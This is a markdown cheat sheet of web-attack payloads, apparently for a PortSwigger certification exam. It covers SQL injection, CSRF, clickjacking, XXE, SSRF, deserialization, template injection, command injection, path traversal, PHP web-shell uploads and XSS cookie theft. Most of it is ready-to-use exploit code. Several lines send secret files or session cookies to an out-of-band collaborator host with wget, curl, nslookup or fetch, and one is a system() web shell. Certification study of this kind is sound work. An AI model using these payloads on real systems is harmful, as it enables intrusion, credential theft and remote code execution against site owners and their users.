| PostgreSQL | `--` | `\|\|` | `pg_sleep(10)` | `SELECT version()` |
| MySQL | `-- ` or `#` | `CONCAT()` | `SLEEP(5)` | `SELECT @@version` |
| MS SQL | `--` | `+` | `WAITFOR DELAY '0:0:10'` | `SELECT @@version` |
| Oracle | `--` | `\|\|` | `dbms_lock.sleep(10)` | `SELECT banner FROM v$version` |

---

## Common Injection Points

| Location | Example Payload | Notes |
|----------|----------------|-------|
| TrackingId cookie | `Cookie: TrackingId=xyz'--` | Most common |
| Search parameter | `?search=test'--` | Check advanced search |
| Category filter | `?category=Gifts'--` | Product filters |
| Product ID | `?productId=1'--` | Numeric parameters |
| XML stock check | See XML-based section | Use Hackvertor |

---

## Exam Tips

1. **Try SQLMap first** - Save time, run in background
2. **Error-based is fastest** - Try CAST technique first
3. **Check TrackingId cookie** - Most common location
4. **Use Hackvertor for XML** - Essential for WAF bypass
5. **Burp Collaborator for OOB** - DNS/HTTP exfiltration
6. **Time-based is last resort** - Very slow (20+ mins)

---

## Pattern: ORDER BY / GROUP BY Injection
**Context:** SQL injection in ORDER BY or GROUP BY clause (less common but appears in exams)

### Boolean-Based Blind (PostgreSQL)
```sql
order=ASC,(SELECT (CASE WHEN (7435=7435) THEN 1 ELSE 1/(SELECT 0) END))
```

**How it works:**
- If condition true → returns 1 (valid)
- If condition false → division by zero error
- Use for character-by-character extraction

**Extract password:**
```sql
order=ASC,(SELECT (CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN 1 ELSE 1/(SELECT 0) END))
```

---

### Error-Based (PostgreSQL)
```sql
order=ASC,(CAST((CHR(113)||CHR(98)||CHR(122)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (6223=6223) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(98)||CHR(113)||CHR(113)) AS NUMERIC))
```

**Simplified for password extraction:**
```sql
order=ASC,CAST((SELECT password FROM users WHERE username='administrator') AS NUMERIC)
```

**Result:** Password appears in error message

---

### Time-Based Blind (PostgreSQL)
```sql
order=ASC,(SELECT (CASE WHEN (5657=5657) THEN (SELECT 5657 FROM PG_SLEEP(5)) ELSE 1/(SELECT 0) END))
```

**Extract password character-by-character:**
```sql
order=ASC,(SELECT (CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN (SELECT 1 FROM PG_SLEEP(5)) ELSE 1 END))
```

**Use Burp Intruder:**
- Position: `='§a§'`
- Payload: a-z, 0-9
- Check response time (5+ seconds = match)

---

## Pattern: Error-Based Extraction
**Common Location:** TrackingId cookie, search parameters

### CAST Technique (PostgreSQL/SQL Server)
```sql
' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS int)--
```
**Result:** Password appears in error message

---

## Pattern: Blind SQLi - Out-of-Band

### MS SQL Server
```sql
'; exec master..xp_dirtree '//COLLAB.oastify.com/a'--
```

### Oracle - Data Exfiltration
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLAB.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

---

## Pattern: XML-Based SQLi with WAF
**Use Hackvertor extension**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId><@dec_entities>1 UNION SELECT password FROM users WHERE username='administrator'-- -</@dec_entities></productId>
  <storeId>1</storeId>
</stockCheck>
```

---

# CSRF

## Pattern: Referer Bypass

### Remove Referer Header
```html
<html>
<meta name="referrer" content="never">
  <body>
    <form action="https://TARGET/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@evil.com" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### Referer Validation Bypass
```html
<script>
history.pushState('', '', '/?TARGET.web-security-academy.net');
document.forms[0].submit();
</script>
```

---

## Pattern: Token Duplication via CRLF
```html
<html>
  <body>
    <form action="https://TARGET/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@evil.com" />
      <input type="hidden" name="csrf" value="fake" />
    </form>
    <img src="https://TARGET/?search=x%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite%3dNone" onerror="document.forms[0].submit();">
  </body>
</html>
```

---

## Pattern: SameSite Bypass via OAuth Refresh
```html
<script>
window.onclick = () => {
  window.open('https://TARGET/social-login');
  setTimeout(() => document.forms[0].submit(), 5000);
}
</script>
```

---

# Clickjacking

## Pattern: Clickjacking with Pre-filled XSS
**Context:** Overlay transparent iframe over decoy button to trick user into clicking

### Basic Clickjacking Attack
```html
<style>
	iframe {
		position:relative;
		width:700px;
		height: 1000px;
		opacity: 0.1;
		z-index: 2;
	}
	div {
		position:absolute;
		top:800px;
		left:80px;
		z-index: 1;
	}
</style>
<div>Click me</div>
<iframe src="https://TARGET/my-account"></iframe>
```

**How it works:**
- `opacity: 0.1` makes iframe nearly invisible (use `0.0001` for production)
- `z-index: 2` places iframe above the decoy button
- `position:absolute` on div positions decoy button
- User clicks "Click me" but actually clicks iframe button
- Adjust `top` and `left` to align with target button

---

### Clickjacking + XSS (Pre-filled Form)
**Context:** Combine clickjacking with XSS payload in form parameters

```html
<style>
	iframe {
		position:relative;
		width:700px;
		height: 1000px;
		opacity: 0.1;
		z-index: 2;
	}
	div {
		position:absolute;
		top:800px;
		left:80px;
		z-index: 1;
	}
</style>
<div>Click me</div>
<iframe src="https://TARGET/feedback?csrf=TOKEN&name=<img src=x onerror='print()'>& email=hacker@evil.com&subject=test&message=test"></iframe>
```

**How it works:**
1. Iframe loads feedback form with pre-filled XSS payload
2. `name` parameter contains: `<img src=x onerror='print()'>`
3. User clicks decoy "Click me" button
4. Actually clicks "Submit" button in iframe
5. Form submits with XSS payload
6. XSS executes when admin views feedback

**URL-encoded version:**
```html
<iframe src="https://TARGET/feedback?csrf=TOKEN&name=%3Cimg+src%3Dx+onerror%3D%22print%281%29%22%3E&email=world%40world.com&subject=s&message=sss"></iframe>
```

---

### Positioning Tips

**Find button position:**
1. Set `opacity: 0.5` to see both layers
2. Adjust `top` and `left` values
3. Use browser DevTools to inspect coordinates
4. Set `opacity: 0.0001` for final exploit

**Common positions:**
- Delete button: `top: 300px; left: 50px`
- Submit button: `top: 800px; left: 80px`
- Confirm button: `top: 500px; left: 200px`

---

### Defense Check

**Test if site is vulnerable:**
```html
<iframe src="https://TARGET/"></iframe>
```

**If blocked, you'll see:**
- Blank iframe (X-Frame-Options header)
- Console error: "Refused to display in a frame"
- CSP frame-ancestors directive blocking

**Bypass attempts:**
- Try different endpoints (`/my-account`, `/admin`)
- Check if only homepage is protected
- Look for subdomain without protection

---

## Exam Tips - Clickjacking

1. **Adjust opacity for testing** - Use `0.5` to see alignment
2. **Use DevTools** - Inspect button coordinates
3. **Pre-fill forms** - Include XSS/CSRF payloads in URL
4. **Test all endpoints** - Some may lack X-Frame-Options
5. **Combine with XSS** - Pre-fill form fields with payloads
6. **Use CSRF tokens** - Extract from page if needed

---

# XXE

## Pattern: Blind XXE with Out-of-Band Interaction
**Context:** Stock check XML, no direct output

### Basic Out-of-Band Detection
```xml
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
```

**How it works:**
1. Defines parameter entity `%xxe` pointing to Burp Collaborator
2. Executes `%xxe` which makes HTTP request
3. Check Burp Collaborator for DNS/HTTP callback
4. Confirms XXE vulnerability

---

## Pattern: Blind XXE - Data Exfiltration via External DTD

### Step 1: Create External DTD on Exploit Server (`/exploit.dtd`)
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```

**For exam (read `/home/carlos/secret`):**
```xml
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```

### Step 2: Trigger from Stock Check Request
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

**Replace `YOUR-DTD-URL` with:** `https://exploit-server.net/exploit.dtd`

### Step 3: Check Burp Collaborator
- Look for HTTP request with `?x=` parameter
- Data from `/home/carlos/secret` appears in URL

**Note:** `&#x25;` = `%` (required for nested parameter entities)

---

## Pattern: Blind XXE - Error-Based Exfiltration

### Step 1: Create Malicious DTD on Exploit Server (`/exploit.dtd`)
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

**For exam:**
```xml
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

**How it works:**
1. Reads file into `%file` entity
2. Tries to access `file:///invalid/[file contents]`
3. Invalid path causes error
4. File contents appear in error message

### Step 2: Trigger from Stock Check Request
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

### Step 3: Check Response
- Error message contains file contents
- Look for "No such file or directory: /invalid/[SECRET]"

---

## Pattern: XInclude Attack
**Context:** Cannot modify DOCTYPE (only control data inside XML)

### Payload
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

**For stock check (productId parameter):**
```xml
<stockCheck>
<productId xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///home/carlos/secret"/>
</productId>
<storeId>1</storeId>
</stockCheck>
```

**When to use:**
- Cannot modify DOCTYPE declaration
- Only control element content
- Application uses XInclude-aware XML parser

---

## XXE Quick Reference

| Technique | Use Case | Output Location |
|-----------|----------|-----------------|
| Out-of-band interaction | Detect XXE | Burp Collaborator |
| External DTD exfiltration | Extract data blind | Burp Collaborator HTTP logs |
| Error-based exfiltration | Extract data blind | Error message in response |
| XInclude | No DOCTYPE control | Direct in response |

---

## Exam Tips

1. **Scan entire stock check request** - Not just targeted scan
2. **Use Burp Scanner** - Detects XXE automatically
3. **Host DTD on exploit server** - Required for blind XXE
4. **Check Burp Collaborator** - DNS and HTTP logs
5. **Try XInclude** - If DOCTYPE modification blocked
6. **Error-based is faster** - No need for Collaborator polling

---

# SSRF

## Pattern: Routing-Based SSRF
**Common Location:** Host header

### Step 1: Enumerate Internal IPs (Burp Intruder)
```
GET /admin HTTP/2
Host: 192.168.0.§1§
```
**Range:** 0-255

### Step 2: Access Admin Panel
```
GET /admin/delete?username=carlos&csrf=TOKEN HTTP/2
Host: 192.168.0.113
```

---

## Pattern: Absolute URL Bypass
```
GET https://TARGET/admin/delete?username=carlos HTTP/2
Host: 192.168.0.108
```

---

## Pattern: Localhost Bypass
```
GET /admin/delete?username=carlos HTTP/2
Host: localhost
```

---

## Pattern: Connection State Attack
**Burp Repeater: Send group in sequence (single connection)**

**Request 1:**
```
GET / HTTP/1.1
Host: TARGET.web-security-academy.net
Connection: keep-alive
```

**Request 2:**
```
GET /admin HTTP/1.1
Host: 192.168.0.1
Connection: keep-alive
```

---

## Pattern: Cache Poisoning via Duplicate Host
```
GET / HTTP/1.1
Host: TARGET.web-security-academy.net
Host: EXPLOIT-SERVER.net
```

---

# Access Control

## Pattern: Referer-Based Bypass
```
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Cookie: session=WIENER_SESSION
Referer: https://TARGET/admin
```

---

## Pattern: Method Conversion
**POST → GET**
```
GET /admin-roles?username=wiener&action=upgrade HTTP/2
```

---

## Pattern: Multi-Step Bypass
**Skip to confirmation step**
```
POST /admin-roles HTTP/2

action=upgrade&confirmed=true&username=wiener
```

---

## Pattern: IDOR with Hidden Parameters
```json
POST /my-account HTTP/2
Content-Type: application/json

{
  "email": "wiener@example.com",
  "roleid": 2
}
```
**Brute-force `roleid` 1-10 with Intruder**

---

# Deserialization

## Pattern: PHP Type Juggling
```php
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```
**Why:** `0 == "any_string"` → `true` in PHP

---

## Pattern: Java ysoserial
```bash
java -jar ysoserial.jar \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  CommonsCollections7 'nslookup $(cat /home/carlos/morale.txt).COLLAB.oastify.com'
```
**Output:** Base64-encode and set as cookie

---

# SSTI

## Pattern: Template Detection
```
{{7*7}}
${7*7}
<%= 7*7 %>
```

---

## Pattern: Jinja2 (Python)
```python
{{ ''.__class__.__mro__[1].__subclasses__()[396]('/home/carlos/secret').read() }}
```

---

## Pattern: Freemarker (Java)
```java
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /home/carlos/secret") }
```

---

## Pattern: Handlebars (Node.js)
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## Pattern: DNS Exfiltration
```bash
||nslookup $(cat /home/carlos/secret).COLLAB.oastify.com||
```

### XML Context (DOCTYPE Disallowed)
```xml
<email>`0&amp;ping $(cat /home/carlos/secret).COLLAB.oastify.com &amp;`</email>
```

### Image Size Parameter
```
?ImgSize="`wget --post-file /home/carlos/secret https://COLLAB.oastify.com/`"
```

**Alternative:**
```
?ImgSize="`curl -F file=@/home/carlos/secret https://COLLAB.oastify.com/`"
```

---

# Path Traversal

## Pattern: Double URL Encoding
```
..%252f..%252f..%252fhome%252fcarlos%252fsecret
```

### Keyword Blacklist Bypass (Hex Encode "secret")
```
..%252f..%252f..%252fhome%252fcarlos%252f%73%65%63%72%65%74
```

### Double Hex Encoding
```
..%252f..%252f..%252fhome%252fcarlos%252f%25%37%33%25%36%35%25%36%33%25%37%32%25%36%35%25%37%34
```

---

# SSRF via PDF

## Pattern: HTML Injection in PDF Generation
**Context:** Admin panel "Download report as PDF"

```json
{"table-html":"<div><p>Report</p><iframe src='http://localhost:6566/home/carlos/secret'></iframe></div>"}
```

**Steps:**
1. Download PDF normally, intercept request
2. Modify JSON body with iframe payload
3. Forward request
4. Open downloaded PDF
5. Flag visible in PDF content

---

# Stage 3 Quick Reference

## Pattern Recognition (30 seconds)

| Observation | Vulnerability | Time Estimate |
|-------------|---------------|---------------|
| Template editing visible | SSTI | 5-10 mins |
| Image with `?ImgSize=` parameter | Command Injection | 15 mins |
| Image with `?filename=` (no size) | Path Traversal | 5 mins |
| File upload functionality | XXE | 20 mins |
| PDF download feature | SSRF via PDF | 20 mins |
| Admin panel shows images | Check LFI + Command Injection | 10-15 mins |

---

## SSTI Quick Attack (5-10 mins)

### Jinja2 - Read File
```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/home/carlos/secret').read() }}
```

**Alternative (if filtered):**
```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

---

## LFI Quick Attack (5 mins)

### Basic Payload
```
?filename=..%252f..%252f..%252f..%252f/home/carlos/secret
```

### If "secret" Blacklisted (Hex Encode)
```
?filename=..%252f..%252f..%252f..%252fhome/carlos/%73%65%63%72%65%74
```

### Double Hex Encode
```
?filename=..%252f..%252f..%252f..%252fhome/carlos/%25%37%33%25%36%35%25%36%33%25%37%32%25%36%35%25%37%34
```

---

## Command Injection Quick Attack (15 mins)

### Image Size Parameter
```
?ImgSize="`wget --post-file /home/carlos/secret https://COLLAB.oastify.com/`"
```

**Alternative:**
```
?ImgSize="`curl -F file=@/home/carlos/secret https://COLLAB.oastify.com/`"
```

### XML Upload (DOCTYPE Disallowed)
```xml
<email>`0&amp;ping $(cat /home/carlos/secret).COLLAB.oastify.com &amp;`</email>
```

---

## XXE Quick Attack (20 mins)

### Step 1: Create External DTD on Exploit Server (`/exploit.dtd`)
```xml
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLAB.oastify.com/?x=%file;'>">
%eval;
%exfil;
```

### Step 2: Upload This XML
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://EXPLOIT-SERVER/exploit.dtd"> %xxe;]>
<users>
  <user>
    <username>test</username>
    <email>test@test.com</email>
  </user>
  <user>
    <username>&xxe;</username>
    <email>test2@test.com</email>
  </user>
</users>
```

### Step 3: Check Burp Collaborator

---

## Burp Collaborator Setup

**Steps:**
1. Burp → Burp menu → Burp Collaborator client
2. Click "Copy to clipboard"
3. Use in payloads (replace `COLLAB.oastify.com`)
4. Click "Poll now" to check
5. Look for HTTP/DNS requests with data

**What to Look For:**
- **DNS:** Subdomain contains exfiltrated data
- **HTTP:** Query parameter or POST body contains data

---

# Path Traversal

## Pattern: Double URL Encoding
```
..%252f..%252f..%252fhome%252fcarlos%252fsecret
```

---

# File Upload

## Pattern: Polyglot PHP Web Shell
**Context:** Avatar/image upload with extension/content-type filtering

### Create Polyglot File (Read Secret)
```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" poc.png -o polyglot.php
```

**How it works:**
1. Creates valid image file with PHP code in EXIF comment
2. Upload as `polyglot.php`
3. Server executes PHP code
4. Secret appears between START and END markers

---

### Alternative: Simple Web Shell
```bash
exiftool -Comment="<?php system($_GET['cmd']); ?>" image.jpg -o shell.php
```

**Usage:**
```
/files/avatars/shell.php?cmd=cat /home/carlos/secret
```

---

### Magic Bytes Bypass
**Add GIF header to PHP shell:**
```php
GIF89a;
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

### Extension Bypass Techniques

| Technique | Example | Notes |
|-----------|---------|-------|
| Alternative extensions | `.php5`, `.phtml`, `.phar` | Try all PHP extensions |
| Case variation | `.pHp`, `.PhP` | Bypass case-sensitive filters |
| Null byte | `shell.php%00.jpg` | Works on older systems |
| Double extension | `shell.php.jpg` | Some servers execute first extension |

---

### Content-Type Bypass
```http
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

### .htaccess Configuration Override
**Context:** Apache server allows .htaccess upload

**Step 1:** Upload malicious .htaccess file
```apache
<Files ~ "^\.ht">
Order allow,deny
Allow from all
</Files>

# Make .htaccess file be interpreted as php file
AddType application/x-httpd-php .htaccess
```

**Step 2:** Add PHP code to same .htaccess file
```apache
<Files ~ "^\.ht">
Order allow,deny
Allow from all
</Files>

AddType application/x-httpd-php .htaccess

# PHP code below
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

**How it works:**
1. First directive allows .htaccess to be accessed via web
2. `AddType` makes Apache interpret .htaccess as PHP
3. PHP code at bottom executes when .htaccess is accessed
4. Visit `/files/avatars/.htaccess` to execute code

**Alternative - Make images execute as PHP:**
```apache
AddType application/x-httpd-php .jpg .png .gif
```
Then upload `shell.jpg` with PHP code inside.

---

## Exam Tips

1. **Use exiftool for polyglot** - Most reliable method
2. **Read file directly** - `file_get_contents('/home/carlos/secret')`
3. **Try multiple extensions** - `.php`, `.php5`, `.phtml`
4. **Check upload directory** - Usually `/files/avatars/` or `/files/`
5. **Add START/END markers** - Easy to find output in response

---

# Exam Patterns

## Stage 1: Get Access to Any User

### Pattern 1: DOM XSS → Cookie Theft
1. Find search/feedback form
2. Test for DOM XSS: `<><img src=x onerror=alert(1)>`
3. Steal cookie: `<><img src=x onerror="fetch('https://COLLAB.oastify.com?c='+document.cookie)">`
4. Use stolen cookie to login

### Pattern 2: Stored XSS → Session Hijack
1. Find comment/feedback functionality
2. Test stored XSS in website field: `javascript:alert(1)`
3. Admin views comment → session stolen

### Pattern 3: CSRF → Password Reset
1. Find email change functionality
2. Test CSRF bypasses (method change, remove token, Referer bypass)
3. Change admin email to yours
4. Reset admin password
5. Login as admin

---

## Stage 2: Privilege Escalation

### Pattern 1: SQL Injection → Admin Credentials
1. Look for "Advanced Search" page
2. Use SQLMap: `sqlmap -r request.txt --level 5 --risk 3 --batch --dump`
3. Extract admin password
4. Login as admin

### Pattern 2: Error-Based SQLi (Manual)
1. Find TrackingId cookie or search parameter
2. Test: `' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS int)--`
3. Password appears in error message

### Pattern 3: JSON Role Manipulation
1. Update profile, intercept request
2. Add hidden parameter: `"roleid": 2` or `"isAdmin": true`
3. Brute-force roleid values with Intruder

### Pattern 4: Access Control Bypass
1. Find admin functionality
2. Try as low-priv user with:
   - POST → GET conversion
   - Referer: `/admin`
   - Skip to confirmation step (`confirmed=true`)

### Pattern 5: Deserialization Cookie Tampering
1. Decode session cookie (Base64)
2. Modify: `"isAdmin":b:1` or `"access_token":i:0`
3. Re-encode and replace cookie

---

## Stage 3: File System Access

### Pattern 1: XXE → Read `/home/carlos/secret`
1. Find stock check XML request
2. Host external DTD on exploit server
3. Use blind XXE with OOB exfiltration
4. Check Burp Collaborator for secret

### Pattern 2: SSRF → Internal Service
1. Find Host header or URL parameter
2. Enumerate internal IPs: `192.168.0.1-255`
3. Access `localhost:6566/home/carlos/secret`

### Pattern 3: Command Injection → DNS Exfiltration
1. Find feedback form or email field
2. Test: `||nslookup $(cat /home/carlos/secret).COLLAB.oastify.com||`
3. Check Burp Collaborator DNS logs

### Pattern 4: SSTI → RCE
1. Test template expressions: `{{7*7}}`, `${7*7}`
2. Identify engine (Jinja2, Freemarker, etc.)
3. Use engine-specific RCE payload
4. Read `/home/carlos/secret`

---

## Common Exam Locations

| Vulnerability | Primary Location | Secondary Location |
|---------------|------------------|-------------------|
| XSS | Search bar, feedback form | Comments, profile |
| SQL Injection | Advanced search, TrackingId cookie | Product filter |
| CSRF | Email change | Password change |
| XXE | Stock check XML | File upload |
| SSRF | Host header, stock check | Admin panel features |
| Access Control | Admin panel | Profile update |
| SSTI | Product details | Error messages |
| Command Injection | Feedback email field | File upload |
| Path Traversal | Image parameter | File download |

---

## Quick Checklist

**Stage 1:**
- [ ] Test search for DOM XSS
- [ ] Test comments for stored XSS
- [ ] Test email change for CSRF
- [ ] Check for AngularJS (`ng-app`)

**Stage 2:**
- [ ] Look for "Advanced Search" → SQLMap
- [ ] Test TrackingId cookie for SQLi
- [ ] Inspect profile JSON for hidden parameters
- [ ] Try POST → GET on admin functions
- [ ] Decode session cookie for deserialization

**Stage 3:**
- [ ] Scan stock check XML for XXE
- [ ] Enumerate internal IPs for SSRF
- [ ] Test feedback email for command injection
- [ ] Test template expressions for SSTI
- [ ] Try DNS exfiltration for blind vulnerabilities




